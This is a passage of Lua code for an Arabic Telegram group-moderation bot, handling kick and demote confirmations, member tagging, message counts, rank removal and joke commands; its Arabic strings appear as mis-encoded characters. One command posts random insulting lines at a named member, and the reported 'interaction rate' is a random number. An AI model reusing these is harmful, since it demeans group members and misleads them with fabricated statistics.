https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Source_Rinda&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if ChatType == 'sp' or ChatType == 'gp'  then
if text == "ุงุทุฑุฏูู" and ChCheck(msg) or text == "ุงุฏูุฑูู" and ChCheck(msg) then
if DevRio:get(Rinda.."Rio:Kick:Me"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุนุฐุฑุง ูุฐู ุงูุฎุงุตูู ูุนุทูู ', 1, 'md')
return false
end
DevRio:set(Rinda..'yes'..msg.sender_user_id_, 'delyes')
DevRio:set(Rinda..'no'..msg.sender_user_id_, 'delno')
local Text = 'โ๏ธฐูู ุงูุช ูุชุฃูุฏ ูู ุงููุบุงุฏุฑู'
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุนู โข",callback_data="/delyes"},{text="โข ูุง โข",callback_data="/delno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุชุนุทูู ุงุทุฑุฏูู' and Manager(msg) and ChCheck(msg) then
DevRio:set(Rinda.."Rio:Kick:Me"..msg.chat_id_, true)
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุฑ ุงุทุฑุฏูู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'ุชูุนูู ุงุทุฑุฏูู' and Manager(msg) and ChCheck(msg) then
DevRio:del(Rinda.."Rio:Kick:Me"..msg.chat_id_)
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุฑ ุงุทุฑุฏูู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ูุฒููู" and ChCheck(msg) then
if DevRio:get(Rinda.."Rio:Del:Me"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุนุฐุฑุง ูุฐู ุงูุฎุงุตูู ูุนุทูู ', 1, 'md')
return false
end
DevRio:set(Rinda..'yesdel'..msg.sender_user_id_, 'delyes')
DevRio:set(Rinda..'nodel'..msg.sender_user_id_, 'delno')
local Text = 'โ๏ธฐูู ุงูุช ูุชุฃูุฏ ูู ุชูุฒููู'
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุนู โข",callback_data="/yesdel"},{text="โข ูุง โข",callback_data="/nodel"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุชุนุทูู ูุฒููู' and BasicConstructor(msg) and ChCheck(msg) then
DevRio:set(Rinda.."Rio:Del:Me"..msg.chat_id_, true)
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุฑ ูุฒููู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'ุชูุนูู ูุฒููู' and BasicConstructor(msg) and ChCheck(msg) then
DevRio:del(Rinda.."Rio:Del:Me"..msg.chat_id_)
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุฑ ูุฒููู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and (text == 'ุชูุนูู ุงูุชุงู' or text == 'ุชูุนูู ุงูุชุงู ูููู' or text == 'ุชูุนูู ุชุงู ูููู') and Admin(msg) and ChCheck(msg) then 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุฑ ุชุงู ูููู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Lock:TagAll'..msg.chat_id_)
end
if text and (text == 'ุชุนุทูู ุงูุชุงู' or text == 'ุชุนุทูู ุงูุชุงู ูููู' or text == 'ุชุนุทูู ุชุงู ูููู') and Admin(msg) and ChCheck(msg) then 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุฑ ุชุงู ูููู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Lock:TagAll'..msg.chat_id_,true)
end
if Admin(msg) then
if text == "ุชุงู ูููู" and ChCheck(msg) then
if not DevRio:get(Rinda..'Rio:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "โ๏ธฐููููู ูุงูุฑุจุน \n-----------------------------------------\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevRio:get(Rinda..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevRio:get(Rinda..'Save:UserName'..v.user_id_).."]\n"
else
text = text..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^ููููู (.*)$") and ChCheck(msg) then
local txt = {string.match(text, "^(ููููู) (.*)$")}
if not DevRio:get(Rinda..'Rio:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "โ๏ธฐ"..txt[2].." \n-----------------------------------------\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevRio:get(Rinda..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevRio:get(Rinda..'Save:UserName'..v.user_id_).."]\n"
else
text = text..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุฑุณุงุฆูู" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then
local user_msgs = DevRio:get(Rinda..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุนุฏุฏ ุฑุณุงุฆูู ููุง โข *โจ "..user_msgs.." โฉ*", 1, 'md')
end
if text == "ุงูุชูุงุนู" and ChCheck(msg) then
local EntryNumber = (DevRio:get(Rinda..'Rio:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (DevRio:get(Rinda..'Rio:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (DevRio:get(Rinda..'Rio:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงูุถูุงู ุงูุงุนุถุงุก ุงูููู โข *"..EntryNumber.."*\nโ๏ธฐูุบุงุฏุฑุฉ ุงูุงุนุถุงุก ุงูููู โข *"..ExitNumber.."*\nโ๏ธฐุนุฏุฏ ุงูุฑุณุงุฆู ุงูููู โข *"..MsgNumberDay.."*\nโ๏ธฐูุณุจุฉ ุงูุชูุงุนู ุงูููู โข *"..math.random(40,100).."%*", 1, 'md')
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุชุนุทูู ุชูุงุนูู" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุชูุงุนูู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:msg:Rio'..msg.chat_id_) 
end
if text == "ุชูุนูู ุชูุงุนูู" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุชูุงุนูู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:msg:Rio'..msg.chat_id_,true)  
end
if DevRio:get(Rinda.."Rio:msg:Rio"..msg.chat_id_) then
if msg.content_.ID then
get_msg = DevRio:get(Rinda.."Rio:msg:Rio"..msg.sender_user_id_..":"..msg.chat_id_) or 0
gms = get_msg + 1
DevRio:setex(Rinda..'Rio:msg:Rio'..msg.sender_user_id_..":"..msg.chat_id_,86400,gms)
end
if text == "ุชูุงุนูู" and tonumber(msg.reply_to_message_id_) == 0 then    
get_msg = DevRio:get(Rinda.."Rio:msg:Rio"..msg.sender_user_id_..":"..msg.chat_id_) or 0
send(msg.chat_id_, msg.id_,"โ๏ธฐุนุฏุฏ ุฑุณุงุฆูู ุงูููู ูู โฌ\n"..get_msg.." ูู ุงูุฑุณุงุฆู")
end  
if text == "ุชูุงุนูู" and tonumber(msg.reply_to_message_id_) > 0 then    
if tonumber(msg.reply_to_message_id_) ~= 0 then 
function prom_reply(extra, result, success) 
get_msg = DevRio:get(Rinda.."Rio:msg:Rio"..result.sender_user_id_..":"..msg.chat_id_) or 0
send(msg.chat_id_, msg.id_,"โ๏ธฐุนุฏุฏ ุฑุณุงุฆูู ุงูููู ูู โฌ\n"..get_msg.." ูู ุงูุฑุณุงุฆู")
end  
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},prom_reply, nil)
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุฌูุงุชู" and ChCheck(msg) or text == "ุงุถุงูุงุชู" and ChCheck(msg) then add = (tonumber(DevRio:get(Rinda..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุนุฏุฏ ุฌูุงุชู ุงููุถุงูู โข *โจ "..add.." โฉ* ", 1, 'md') end
if text == "ุชุนุฏููุงุชู" or text == "ุณุญูุงุชู" and ChCheck(msg) then local edit_msg = DevRio:get(Rinda..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุนุฏุฏ ุชุนุฏููุงุชู โข *โจ "..edit_msg.." โฉ* ", 1, 'md') end
if text == "ุฑุชุจุชู" and ChCheck(msg) then Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุฑุชุจุชู โข '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'html') end
if text == "ุงูุฏู ุงููุฌููุนู" and ChCheck(msg) then Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงูุฏู ุงููุฌููุนู โข `"..msg.chat_id_.."`", 1, 'md') end
if text == 'ูุณุญ ุฌูุงุชู' or text == 'ูุณุญ ุงุถุงูุงุชู' or text == 'ุญุฐู ุฌูุงุชู' or text == 'ุญุฐู ุงุถุงูุงุชู' then DevRio:del(Rinda..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุญุฐู ุฌููุน ุฌูุงุชู ุงููุถุงูู' , 1, 'md') end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match('^ูููู @(.*)') and ChCheck(msg) or text and text:match('^ููููุง @(.*)') and ChCheck(msg) then 
if not DevRio:get(Rinda..'Rio:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^ูููู @(.*)') or text:match('^ููููุง @(.*)') 
function RindaTeam(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(Rinda) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'ุดู ุชูุถุฑุท ุงูู ูุงุญุฏ ูููู ููุณูุ๐ค๐๐ฟ', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'ุฏู ููู ุชุฑูุฏ ุงูููู ุชุงุฌ ุฑุงุณููุ๐๐๐ฟ', 1, 'md') 
return false  
end  
if tonumber(result.id_) == tonumber(1558668590) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'ุฏู ููู ุชุฑูุฏ ุงูููู ุชุงุฌ ุฑุงุณููุ๐๐๐ฟ', 1, 'md') 
return false  
end  
if DevRio:sismember(Rinda.."Rio:RioConstructor:"..msg.chat_id_,result.id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'ุฏู ููู ุชุฑูุฏ ุงูููู ุชุงุฌ ุฑุงุณููุ๐๐๐ฟ', 1, 'md')
return false
end 
local RindaTeam = "ุตุงุฑุฑ ุณุชุงุฐูู ๐๐ปโโ๏ธโฅ๏ธ" 
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md') 
local RindaTeam = { "ููู ุฌุฑุฌู @"..username.." ุงุญุชุฑู ุงุณูุงุฏูู ูุง ุงูุชููู ูุงุฒุฑุจุจ ุนูู ูุจุฑููุ๐ฉ๐๐ฟ","ูุดุด ููู ูุงุดู @"..username.." ูุชุถู ุชูุณูุช ูุง ุงุฎุฑุจุท ุชุถุงุฑูุณ ูุฌูู ุฌูู ุงุจุท ุนุจุฏูุ ๐๐๐ฟ","ุญุจูุจู @"..username.." ุฑุงุญ ุงุญุงูู ุงุญุชุฑููู ูุงููุฑู ุจููู ุชุจุทู ุญููููุ ๐ค๐ช","ุฏูุดู ูู @"..username.." ููุจูุน ุงููุดู ูู ุฒูู ููููู ููุญุฌู ููุงู ูู ููุจูุฐ ๐๐๐ฟ","ูุง ุงูุบููุถ ุงูุชูุณ ุงุจู ุฑุงุณ ุงููุฑุจุน @"..username.." ูุชุนูููู ุฌู ุญุฌุงูู ูุฌุงู ุชุทูุทููู ุนูููู ุฏุจุทู๐๐ช",}
Dev_Rio(msg.chat_id_, result.id_, 1,''..RindaTeam[math.random(#RindaTeam)], 1, 'html') 
else  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุถู ุบูุฑ ููุฌูุฏ ูู ุงููุฌููุนู', 1, 'md') 
end 
end 
resolve_username(username,RindaTeam)
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == ("ูููู") or text == ("ุจุนุฏ ูููู") or text == ("ูููู ุจุนุฏ") or text == ("ูู ูููู") or text == ("ููููุง") or text == ("ููููู") or text == ("ุฑุฒูู") or text == ("ุฑุฒููู") or text == ("ุฑุฒููุง") then
if not DevRio:get(Rinda..'Rio:Lock:Stupid'..msg.chat_id_) then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(Rinda) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'ุดู ุชูุถุฑุท ุงูู ูุงุญุฏ ูููู ููุณูุ๐ค๐๐ฟ', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'ุฏู ููู ุชุฑูุฏ ุงูููู ุชุงุฌ ุฑุงุณููุ๐๐๐ฟ', 1, 'md')
return false
end 
if tonumber(result.sender_user_id_) == tonumber(1558668590) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'ุฏู ููู ุชุฑูุฏ ุงูููู ุชุงุฌ ุฑุงุณููุ๐๐๐ฟ', 1, 'md')
return false
end 
if DevRio:sismember(Rinda.."Rio:RioConstructor:"..msg.chat_id_,result.sender_user_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'ุฏู ููู ุชุฑูุฏ ุงูููู ุชุงุฌ ุฑุงุณููุ๐๐๐ฟ', 1, 'md')
return false
end 
local RindaTeam = "ุตุงุฑุฑ ุณุชุงุฐูู ๐๐ปโโ๏ธโฅ๏ธ" 
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md') 
local RindaTeam = {"ููู ุฌุฑุฌู ุงุญุชุฑู ุงุณูุงุฏูู ูุง ุงูุชููู ูุงุฒุฑุจุจ ุนูู ูุจุฑููุ๐ฉ๐๐ฟ","ูุดุด ูุงุดู ูุชุถู ุชูุณูุช ูุง ุงุฎุฑุจุท ุชุถุงุฑูุณ ูุฌูู ุฌูู ุงุจุท ุนุจุฏูุ ๐๐๐ฟ","ุฏูุดู ูู ููุจูุน ุงููุดู ูู ุฒูู ููููู ููุญุฌู ููุงู ูู ููุจูุฐ ๐๐๐ฟ","ูุง ุงูุบููุถ ุงูุชูุณ ุงุจู ุฑุงุณ ุงููุฑุจุน ูุชุนูููู ุฌู ุญุฌุงูู ูุฌุงู ุชุทูุทููู ุนูููู ุฏุจุทู๐๐ช","ุญุจูุจู ุฑุงุญ ุงุญุงูู ุงุญุชุฑููู ูุงููุฑู ุจููู ุชุจุทู ุญููููุ ๐ค๐ช"} 
Dev_Rio(msg.chat_id_, result.id_, 1,''..RindaTeam[math.random(#RindaTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
end
if text == ("ุจูุณู") or text == ("ุจุนุฏ ุจูุณู") or text == ("ุถู ุจูุณ") or text == ("ุจูุณู ุจุนุฏ") or text == ("ุจูุณูุง") or text == ("ุจุนุฏ ุจูุณูุง") or text == ("ุถู ุจูุณ") or text == ("ุจูุณูุง ุจุนุฏ") or text == ("ุจูุณูู") then
if not DevRio:get(Rinda..'Rio:Lock:Stupid'..msg.chat_id_) then
function bosh(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(Rinda) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'ูููููู ุดูููู ุฑุงุญุญ ุงุจูุณ ููุณููุ๐ถ๐', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Rio(msg.chat_id_, result.id_, 1, 'ููุงุญุญุญ ุงุญูุงุง ุจูุณุฉุฉ ุงููุทูุฑูู๐ป๐ฅ๐', 1, 'html')
return false
end 
local RindaTeam = "ุตุงุฑุฑ ุณุชุงุฐูู ๐๐ปโโ๏ธโฅ๏ธ" 
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md') 
local RindaTeam = {"ููุงุญุญุญ ุงููุด ุนุงููููู๐๐ฅ๐","ุงูููููุงุงูุญุญ ุดููุนุณู๐ฅบ๐ฏ๐","ููุงุญุญุญุุกููู ุงุฐูุจ๐คค๐"} 
Dev_Rio(msg.chat_id_, result.id_, 1,''..RindaTeam[math.random(#RindaTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosh)   
end
end
end
if text == ("ุตูุญู") or text == ("ุตูุญูุง") or text == ("ุตูุญูู") or text == ("ุตูุญ") then
if not DevRio:get(Rinda..'Rio:Lock:Stupid'..msg.chat_id_) then
function seha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(Rinda) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'ูููููู ุดูููู ุฑุงุญุญ ุงุตูุญ ููุณููุ๐ถ๐', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Rio(msg.chat_id_, result.id_, 1, 'ุชุนุงู ูุทูุฑูู ูุญุชุงุฌููู๐๐ปโโ๏ธโฅ๏ธ', 1, 'html')
return false
end 
local RindaTeam = "ุตุงุฑุฑ ุณุชุงุฐูู ๐๐ปโโ๏ธโฅ๏ธ" 
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md') 
local RindaTeam = {"ุชุชุนุงู ุญุญุจ ูุญุชุงุฌูู๐๐ญ","ุชุนุงู ูููู ุงุณุชุงุฐูู ุงูุฑูุฏููู๐๐ช","ููุนููุฏ ุชุนุงุงู ูุฑูุฏููู๐คโฅ๏ธ","ุชุนุงู ููู ุฏูุตูุญูู๐๐ค"} 
Dev_Rio(msg.chat_id_, result.id_, 1,''..RindaTeam[math.random(#RindaTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),seha)   
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match('^ุตูุญู @(.*)') and ChCheck(msg) or text and text:match('^ุตูุญ @(.*)') and ChCheck(msg) then 
if not DevRio:get(Rinda..'Rio:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^ุตูุญู @(.*)') or text:match('^ุตูุญ @(.*)') 
function RindaTeam(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(Rinda) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'ูููููู ุดูููู ุฑุงุญุญ ุงุตูุญ ููุณููุ๐ถ๐', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'ุชุนุงู ูุทูุฑูู ูุญุชุงุฌููู๐๐ปโโ๏ธโฅ๏ธ @'..username, 1, 'html') 
return false  
end  
local RindaTeam = "ุตุงุฑุฑ ุณุชุงุฐูู ๐๐ปโโ๏ธโฅ๏ธ" 
Dev_Rio(msg.chat_id_, msg.id_, 1,RindaTeam, 1, 'md') 
local RindaTeam = { "ุชุชุนุงู ุญุญุจ @"..username.." ูุญุชุงุฌูู๐๐ญ","ุชุนุงู ูููู @"..username.." ุงุณุชุงุฐูู ุงูุฑูุฏููู๐๐ช","ููุนููุฏ @"..username.." ุชุนุงุงู ูุฑูุฏููู๐คโฅ๏ธ","ุชุนุงู ููู @"..username.." ุฏูุตูุญูู๐๐ค",}
Dev_Rio(msg.chat_id_, result.id_, 1,''..RindaTeam[math.random(#RindaTeam)], 1, 'html') 
else  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุถู ุบูุฑ ููุฌูุฏ ูู ุงููุฌููุนู', 1, 'md') 
end 
end 
resolve_username(username,RindaTeam)
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == ("ุชูุฒูู ุงููู") and msg.reply_to_message_id_ ~= 0 and Manager(msg) and ChCheck(msg) then 
function promote_by_reply(extra, result, success)
if SudoId(result.sender_user_id_) == true then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูุงุชุณุชุทูุน ุชูุฒูู ุงููุทูุฑ ุงูุงุณุงุณู", 1, 'md')
return false 
end
if DevRio:sismember(Rinda..'Rio:RioSudo:',result.sender_user_id_) then
riosudo = 'ุงููุทูุฑูู ุงูุงุณุงุณููู โข ' else riosudo = '' end
if DevRio:sismember(Rinda..'Rio:SecondSudo:',result.sender_user_id_) then
secondsudo = 'ุงููุทูุฑูู ุงูุซุงููููู โข ' else secondsudo = '' end
if DevRio:sismember(Rinda..'Rio:SudoBot:',result.sender_user_id_) then
sudobot = 'ุงููุทูุฑูู โข ' else sudobot = '' end
if DevRio:sismember(Rinda..'Rio:Owner:'..msg.chat_id_, result.sender_user_id_) then
owner = 'ุงููุงูููู โข ' else owner = '' end
if DevRio:sismember(Rinda..'Rio:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
basicconstructor = 'ุงูููุดุฆูู ุงูุงุณุงุณููู โข ' else basicconstructor = '' end
if DevRio:sismember(Rinda..'Rio:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'ุงูููุดุฆูู โข ' else constructor = '' end 
if DevRio:sismember(Rinda..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'ุงููุฏุฑุงุก โข ' else manager = '' end
if DevRio:sismember(Rinda..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'ุงูุงุฏูููู โข ' else admins = '' end
if DevRio:sismember(Rinda..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'ุงููููุฒูู โข ' else vipmem = '' end
if DevRio:sismember(Rinda..'Rio:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
cleaner = 'ุงูููุธููู โข ' else cleaner = ''
end
if RankChecking(result.sender_user_id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู โข โค\n~ ( "..riosudo..secondsudo..sudobot..owner..basicconstructor..constructor..manager..admins..vipmem..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐูู ุชุชู ุชุฑููุชู ูุณุจูุง")  
end
if RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevRio:srem(Rinda..'Rio:RioSudo:', result.sender_user_id_)
DevRio:srem(Rinda..'Rio:SecondSudo:', result.sender_user_id_)
DevRio:srem(Rinda..'Rio:SudoBot:', result.sender_user_id_)
DevRio:srem(Rinda..'Rio:SecondSudoGp:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:SudoBotGp:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Owner:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'riosudo' then
DevRio:srem(Rinda..'Rio:SecondSudo:', result.sender_user_id_)
DevRio:srem(Rinda..'Rio:SudoBot:', result.sender_user_id_)
DevRio:srem(Rinda..'Rio:SecondSudoGp:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:SudoBotGp:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Owner:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
DevRio:srem(Rinda..'Rio:SudoBot:', result.sender_user_id_)
DevRio:srem(Rinda..'Rio:SecondSudoGp:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:SudoBotGp:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Owner:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
